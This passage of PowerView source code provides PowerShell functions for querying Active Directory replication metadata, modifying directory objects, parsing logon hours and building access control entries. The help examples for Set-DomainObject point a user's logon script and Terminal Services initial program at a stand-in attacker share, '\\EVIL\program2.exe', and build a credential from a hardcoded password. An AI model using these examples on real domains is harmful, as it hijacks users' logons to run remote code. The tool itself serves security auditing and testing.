A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAttributeHistory -Domain testlab.local

Return all attribute replication metadata for all objects in the testlab.local domain.

.EXAMPLE

'S-1-5-21-883232822-274137685-4173207997-1109','CN=dfm.a,CN=Users,DC=testlab,DC=local','da','94299db1-e3e7-48f9-845b-3bffef8bedbb' | Get-DomainObjectAttributeHistory -Properties objectClass | ft

ObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat
                            e            ingChange                 ingDsaDN
--------      ----------    ------------ ------------ -------      ------------
CN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...
CN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...
CN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...

.EXAMPLE

Get-DomainObjectAttributeHistory harmj0y -Properties userAccountControl

ObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb
AttributeName         : userAccountControl
LastOriginatingChange : 2017-03-07T19:56:27Z
Version               : 4
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory links attribute value replication metadata for the
specified object, i.e. a parsed version of the msds-replvaluemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 'msds-replvaluemetadata'.
This is the domain linked attribute value replication metadata associated with the object. The
results are parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory | Group-Object ObjectDN | ft -a

Count Name
----- ----
    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local
    4 CN=Users,CN=Builtin,DC=testlab,DC=local
    2 CN=Guests,CN=Builtin,DC=testlab,DC=local
    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local
    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local
    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local
    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local
    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local
    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local
    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local
    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...
    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...
    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local
    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local


.EXAMPLE

'S-1-5-21-883232822-274137685-4173207997-519','af94f49e-61a5-4f7d-a17c-d80fb16a5220' | Get-DomainObjectLinkedAttributeHistory

ObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-06-13T22:20:02Z
TimeCreated           : 2017-06-13T22:20:02Z
LastOriginatingChange : 2017-06-13T22:20:22Z
Version               : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local

ObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2
AttributeName         : member
AttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local
TimeDeleted           : 2017-04-10T22:17:19Z
TimeCreated           : 2017-04-10T22:17:19Z
LastOriginatingChange : 2017-04-10T22:17:19Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectLinkedAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Set-DomainObject {
<#
.SYNOPSIS

Modifies a gven property for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Splats user/object targeting parameters to Get-DomainObject, returning the raw
searchresult object. Retrieves the raw directoryentry for the object, and sets
any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
from -Clear @().

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Set

Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.

.PARAMETER XOR

Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.

.PARAMETER Clear

Specifies an array of object properties that will be cleared in the directory.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string:
(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object harmj0y
VERBOSE: Setting countrycode to 1234 for object harmj0y
VERBOSE: Get-DomainSearcher search string:
LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object testuser
VERBOSE: Setting countrycode to 1234 for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose

Cleares the 'department' field for both object identities.

.EXAMPLE

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512


Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\primary\sysvol\blah.ps1

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\EVIL\program2.exe
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        # splat the appropriate arguments to Get-DomainObject
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        # UAC value references- https://support.microsoft.com/en-us/kb/305144
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
<#
.SYNOPSIS

Converts the LDAP LogonHours array to a processible object.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Converts the LDAP LogonHours array to a processible object.  Each entry
property in the output object corresponds to a day of the week and hour during
the day (in UTC) indicating whether or not the user can logon at the specified
hour.

.PARAMETER LogonHoursArray

21-byte LDAP hours array.

.EXAMPLE

$hours = (Get-DomainUser -LDAPFilter 'userworkstations=*')[0].logonhours
ConvertFrom-LDAPLogonHours $hours

Gets the logonhours array from the first AD user with logon restrictions.

.OUTPUTS

PowerView.LogonHours
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $Output
    }
}


function New-ADObjectAccessControlEntry {
<#
.SYNOPSIS

Creates a new Active Directory object-specific access control entry.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Creates a new object-specific access control entry (ACE).  The ACE could be 
used for auditing access to an object or controlling access to objects.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER PrincipalSearchBase

The LDAP source to search through for principals, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Right

Specifies the rights set on the Active Directory object.

.PARAMETER AccessControlType

Specifies the type of ACE (allow or deny)

.PARAMETER AuditFlag

For audit ACEs, specifies when to create an audit log (on success or failure)

.PARAMETER ObjectType

Specifies the GUID of the object that the ACE applies to.

.PARAMETER InheritanceType

Specifies how the ACE applies to the object and/or its children.

.PARAMETER InheritedObjectType

Specifies the type of object that can inherit the ACE.

.EXAMPLE

$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
